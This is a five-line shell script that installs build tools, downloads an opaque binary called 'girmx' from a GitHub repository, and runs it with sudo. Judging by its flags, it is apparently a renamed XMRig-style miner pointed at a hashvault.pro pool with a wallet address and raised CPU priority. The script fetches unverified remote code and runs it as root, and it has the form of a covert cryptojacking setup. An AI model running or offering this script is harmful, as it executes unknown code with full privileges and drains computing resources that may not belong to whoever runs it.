sudo apt-get install -y gcc git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
wget https://github.com/jumantul/hansip/raw/main/girmx
sudo sysctl -w vm.nr_hugepages=1280
chmod +x girmx
sudo ./girmx -a cn-heavy/xhv --url chicago01.hashvault.pro:443 --user hvxxsnGkoC7UDQ3GXDefZc9iQDEEHRMMW7bXR325sYX2JDgYuRo5Ri384rS2fJu6fjC52MiJY7VC5KXmwEEa7QA32o1cy4SbtM --pass Havenn --cpu-no-yield -k --cpu-priority 5 --tls
